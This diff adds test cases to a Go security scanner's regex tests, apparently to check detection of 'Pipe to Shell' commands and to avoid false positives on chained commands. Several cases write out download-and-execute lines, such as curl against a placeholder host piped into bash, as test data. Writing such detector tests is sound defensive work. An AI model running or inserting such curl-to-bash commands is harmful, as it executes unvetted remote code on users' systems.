@@ -166,6 +166,36 @@ func TestRegexScanner_Scan(t *testing.T) {
 			content:     "sync -e",
 			wantFinding: "",
 		},
+		{
+			name:        "Curl then Pipe Bash (Chained - False Positive)",
+			content:     "curl http://x; echo done | bash",
+			wantFinding: "",
+		},
+		{
+			name:        "Curl and Pipe Bash (Chained - False Positive)",
+			content:     "curl http://x && echo done | bash",
+			wantFinding: "",
+		},
+		{
+			name:        "Curl Multiline Separated (False Positive)",
+			content:     "curl http://x\n echo done | bash",
+			wantFinding: "",
+		},
+		{
+			name:        "Curl with Intermediate Pipe (Regression Test)",
+			content:     "curl http://x | cat | bash",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Curl with Query Params in Quotes (Regression Test)",
+			content:     `curl "http://x?a=1&b=2" | bash`,
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Curl with Escaped Separators (Regression Test)",
+			content:     `curl http://x?a=1\&b=2 | bash`,
+			wantFinding: "Pipe to Shell",
+		},
 	}
 
 	for _, tt := range tests {
